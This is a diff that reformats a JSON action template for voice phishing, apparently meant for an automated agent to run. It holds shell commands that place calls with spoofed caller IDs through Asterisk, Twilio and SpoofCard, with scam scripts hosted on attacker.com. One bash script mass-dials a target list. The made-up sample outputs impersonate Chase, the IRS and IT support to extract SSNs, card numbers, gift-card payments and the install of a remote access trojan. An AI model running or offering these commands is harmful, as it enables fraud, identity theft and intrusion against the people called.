@@ -2,25 +2,81 @@
   "name": "vishing_voice_phishing",
   "description": "Voice phishing (vishing) using VoIP services and voice manipulation",
   "pattern": "vishing|voice.*phish|voip.*spoof|caller.*id.*spoof",
-  "parameters": ["target_phone", "caller_id"],
+  "parameters": [
+    "target_phone",
+    "caller_id"
+  ],
   "sequence": [
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "asterisk -rx 'originate SIP/+15559876543 application Playback /var/lib/asterisk/sounds/bank_security_message'"]},
-      "expected_output": {"type": "string", "example": "Asterisk VoIP call initiated\n\nDialing: +1 (555) 987-6543\nCaller ID: +1-800-CHASE-BANK (spoofed)\nPlayback: /var/lib/asterisk/sounds/bank_security_message.wav\n\nCall status:\n  [00:00:02] Ringing...\n  [00:00:08] Call answered\n  [00:00:09] Playing automated message:\n\n\"Hello, this is Chase Bank Security Department. We detected suspicious activity on your account ending in 4567. For your protection, your card has been temporarily blocked. Press 1 to speak with a security specialist, or press 2 to confirm these transactions were authorized by you.\"\n\n  [00:00:35] User pressed: 1\n  [00:00:36] Transferring to operator (attacker)\n  [00:00:37] Operator connected\n\nCall recording: /var/spool/asterisk/monitor/recording_20240115_180045.wav\nDuration: 5 minutes 23 seconds\nInformation collected:\n  - Full name: John Michael Doe\n  - Card number: 4532-xxxx-xxxx-4567\n  - CVV: 789\n  - Expiration: 08/26\n  - SSN: xxx-xx-6789\n  - Date of birth: 03/15/1978"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "asterisk -rx 'originate SIP/+15559876543 application Playback /var/lib/asterisk/sounds/bank_security_message'"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Asterisk VoIP call initiated\n\nDialing: +1 (555) 987-6543\nCaller ID: +1-800-CHASE-BANK (spoofed)\nPlayback: /var/lib/asterisk/sounds/bank_security_message.wav\n\nCall status:\n  [00:00:02] Ringing...\n  [00:00:08] Call answered\n  [00:00:09] Playing automated message:\n\n\"Hello, this is Chase Bank Security Department. We detected suspicious activity on your account ending in 4567. For your protection, your card has been temporarily blocked. Press 1 to speak with a security specialist, or press 2 to confirm these transactions were authorized by you.\"\n\n  [00:00:35] User pressed: 1\n  [00:00:36] Transferring to operator (attacker)\n  [00:00:37] Operator connected\n\nCall recording: /var/spool/asterisk/monitor/recording_20240115_180045.wav\nDuration: 5 minutes 23 seconds\nInformation collected:\n  - Full name: John Michael Doe\n  - Card number: 4532-xxxx-xxxx-4567\n  - CVV: 789\n  - Expiration: 08/26\n  - SSN: xxx-xx-6789\n  - Date of birth: 03/15/1978"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "twilio-cli api:core:calls:create --from='+18005551234' --to='+15559876543' --url='http://attacker.com/twiml/irs_scam.xml'"]},
-      "expected_output": {"type": "string", "example": "Twilio call initiated via API\n\nCall SID: CA1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p\nFrom: +1-800-555-1234 (IRS spoofed number)\nTo: +1-555-987-6543\nStatus: initiated → ringing → in-progress\n\nTwiML script executing: http://attacker.com/twiml/irs_scam.xml\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<Response>\n  <Say voice=\"alice\">\n    This is the Internal Revenue Service. This is your final notice. \n    We have been trying to reach you regarding suspicious tax activity. \n    Press 1 now to speak with an IRS agent, or a warrant will be issued \n    for your arrest within 24 hours.\n  </Say>\n  <Gather numDigits=\"1\" action=\"/collect-info\">\n    <Say>Press 1 to continue.</Say>\n  </Gather>\n</Response>\n\nVictim pressed: 1\nRedirected to: /collect-info (live operator)\n\nOperator script:\n  - Claim IRS audit pending\n  - Request SSN for verification\n  - Demand immediate payment via gift cards\n  - Threaten arrest/prosecution\n\nCall outcome:\n  Victim provided SSN: xxx-xx-7890\n  Payment method: $2,000 in iTunes gift cards\n  Card codes: XXXX-XXXX-XXXX (4 cards)"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "twilio-cli api:core:calls:create --from='+18005551234' --to='+15559876543' --url='http://attacker.com/twiml/irs_scam.xml'"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Twilio call initiated via API\n\nCall SID: CA1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p\nFrom: +1-800-555-1234 (IRS spoofed number)\nTo: +1-555-987-6543\nStatus: initiated → ringing → in-progress\n\nTwiML script executing: http://attacker.com/twiml/irs_scam.xml\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<Response>\n  <Say voice=\"alice\">\n    This is the Internal Revenue Service. This is your final notice. \n    We have been trying to reach you regarding suspicious tax activity. \n    Press 1 now to speak with an IRS agent, or a warrant will be issued \n    for your arrest within 24 hours.\n  </Say>\n  <Gather numDigits=\"1\" action=\"/collect-info\">\n    <Say>Press 1 to continue.</Say>\n  </Gather>\n</Response>\n\nVictim pressed: 1\nRedirected to: /collect-info (live operator)\n\nOperator script:\n  - Claim IRS audit pending\n  - Request SSN for verification\n  - Demand immediate payment via gift cards\n  - Threaten arrest/prosecution\n\nCall outcome:\n  Victim provided SSN: xxx-xx-7890\n  Payment method: $2,000 in iTunes gift cards\n  Card codes: XXXX-XXXX-XXXX (4 cards)"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "spoofcard-cli --from '+15551234567' --to '+15559876543' --voice-changer male-deep --recording-url 'http://attacker.com/record' --message 'Hi, this is David from IT Support. We detected malware on your computer...'"]},
-      "expected_output": {"type": "string", "example": "SpoofCard vishing call configured:\n\nOriginal caller ID: +1-555-999-8888 (attacker)\nSpoofed caller ID: +1-555-123-4567 (IT department number)\nTarget: +1-555-987-6543 (victim)\nVoice modification: Male deep (sounds more authoritative)\nCall recording: Enabled → http://attacker.com/record\n\nCall in progress:\n\nAttacker: \"Hi, this is David from IT Support. We detected malware on your computer that's trying to access our corporate network. I need you to install our security software immediately.\"\n\nVictim: \"Oh no, really? What should I do?\"\n\nAttacker: \"I'm going to send you a link via text message. Please install the software right away. It will ask for admin password - that's normal for security software.\"\n\nVictim: \"Okay, let me check... I got the link.\"\n\nAttacker: \"Great. Go ahead and install it, I'll wait on the line.\"\n\n[Victim installs remote access trojan (RAT)]\n\nOutcome:\n  ✓ RAT installed on victim computer\n  ✓ Admin credentials captured\n  ✓ Full remote access established\n  ✓ Corporate network access obtained"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "spoofcard-cli --from '+15551234567' --to '+15559876543' --voice-changer male-deep --recording-url 'http://attacker.com/record' --message 'Hi, this is David from IT Support. We detected malware on your computer...'"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "SpoofCard vishing call configured:\n\nOriginal caller ID: +1-555-999-8888 (attacker)\nSpoofed caller ID: +1-555-123-4567 (IT department number)\nTarget: +1-555-987-6543 (victim)\nVoice modification: Male deep (sounds more authoritative)\nCall recording: Enabled → http://attacker.com/record\n\nCall in progress:\n\nAttacker: \"Hi, this is David from IT Support. We detected malware on your computer that's trying to access our corporate network. I need you to install our security software immediately.\"\n\nVictim: \"Oh no, really? What should I do?\"\n\nAttacker: \"I'm going to send you a link via text message. Please install the software right away. It will ask for admin password - that's normal for security software.\"\n\nVictim: \"Okay, let me check... I got the link.\"\n\nAttacker: \"Great. Go ahead and install it, I'll wait on the line.\"\n\n[Victim installs remote access trojan (RAT)]\n\nOutcome:\n  ✓ RAT installed on victim computer\n  ✓ Admin credentials captured\n  ✓ Full remote access established\n  ✓ Corporate network access obtained"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "cat > vishing_campaign.sh << 'EOF'\n#!/bin/bash\nwhile IFS=',' read -r name phone email company; do\n  echo \"[*] Calling $name at $phone ($company)\"\n  twilio api:core:calls:create \\\n    --from=\"+18005551111\" \\\n    --to=\"$phone\" \\\n    --url=\"http://attacker.com/twiml/verify.xml?name=$name&company=$company\"\n  sleep 30\ndone < targets.csv\nEOF\nchmod +x vishing_campaign.sh\n./vishing_campaign.sh"]},
-      "expected_output": {"type": "string", "example": "Automated vishing campaign started\nTarget list: targets.csv (50 entries)\n\n[*] Calling John Doe at +15551111111 (Acme Corp)\nCall initiated: CA_abc123\nTwiML: Personalized message with name \"John\" and company \"Acme Corp\"\nStatus: completed (3m 45s)\nResult: Victim provided credentials\n\n[*] Calling Jane Smith at +15552222222 (TechStart Inc)\nCall initiated: CA_def456\nStatus: no-answer\nResult: Voicemail left\n\n[*] Calling Bob Johnson at +15553333333 (Finance Plus)\nCall initiated: CA_ghi789\nStatus: completed (7m 12s)\nResult: Victim suspicious, hung up\n\n... [47 more calls]\n\nCampaign statistics:\n  Total calls: 50\n  Answered: 35 (70%)\n  Voicemail: 10 (20%)\n  No answer: 5 (10%)\n  \n  Successful credential harvesting: 18 (36% of total, 51% of answered)\n  Suspicious/hung up: 12 (24%)\n  Completed but no info: 5 (10%)\n\nHarvested data:\n  - 18 sets of login credentials\n  - 12 credit card numbers\n  - 8 social security numbers\n  - 15 email addresses confirmed"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "cat > vishing_campaign.sh << 'EOF'\n#!/bin/bash\nwhile IFS=',' read -r name phone email company; do\n  echo \"[*] Calling $name at $phone ($company)\"\n  twilio api:core:calls:create \\\n    --from=\"+18005551111\" \\\n    --to=\"$phone\" \\\n    --url=\"http://attacker.com/twiml/verify.xml?name=$name&company=$company\"\n  sleep 30\ndone < targets.csv\nEOF\nchmod +x vishing_campaign.sh\n./vishing_campaign.sh"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Automated vishing campaign started\nTarget list: targets.csv (50 entries)\n\n[*] Calling John Doe at +15551111111 (Acme Corp)\nCall initiated: CA_abc123\nTwiML: Personalized message with name \"John\" and company \"Acme Corp\"\nStatus: completed (3m 45s)\nResult: Victim provided credentials\n\n[*] Calling Jane Smith at +15552222222 (TechStart Inc)\nCall initiated: CA_def456\nStatus: no-answer\nResult: Voicemail left\n\n[*] Calling Bob Johnson at +15553333333 (Finance Plus)\nCall initiated: CA_ghi789\nStatus: completed (7m 12s)\nResult: Victim suspicious, hung up\n\n... [47 more calls]\n\nCampaign statistics:\n  Total calls: 50\n  Answered: 35 (70%)\n  Voicemail: 10 (20%)\n  No answer: 5 (10%)\n  \n  Successful credential harvesting: 18 (36% of total, 51% of answered)\n  Suspicious/hung up: 12 (24%)\n  Completed but no info: 5 (10%)\n\nHarvested data:\n  - 18 sets of login credentials\n  - 12 credit card numbers\n  - 8 social security numbers\n  - 15 email addresses confirmed"
+      }
     }
   ],
-  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "stats": {
+    "uses": 0,
+    "successes": 0,
+    "failures": 0,
+    "success_rate": 0.0
+  },
   "created_by": "neural_mesh_v5.2_generator"
 }
